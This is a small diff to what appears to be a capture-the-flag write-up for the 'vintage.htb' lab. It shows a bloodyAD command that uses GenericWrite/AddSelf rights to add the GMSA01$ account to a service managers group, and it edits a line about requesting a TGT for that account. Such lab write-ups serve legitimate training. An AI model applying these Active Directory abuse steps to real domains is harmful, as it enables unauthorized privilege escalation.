@@ -178,4 +178,5 @@ Ive got GenericWrite and AddSelf on the service managers group
 bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember servicemanagers 'GMSA01$' 
 [+] GMSA01$ added to servicemanagers
 ```
-I generated a TGT for the `GMSA`
+I generated a TGT for the `GMSA01$` machine account and then added the user to the group
+
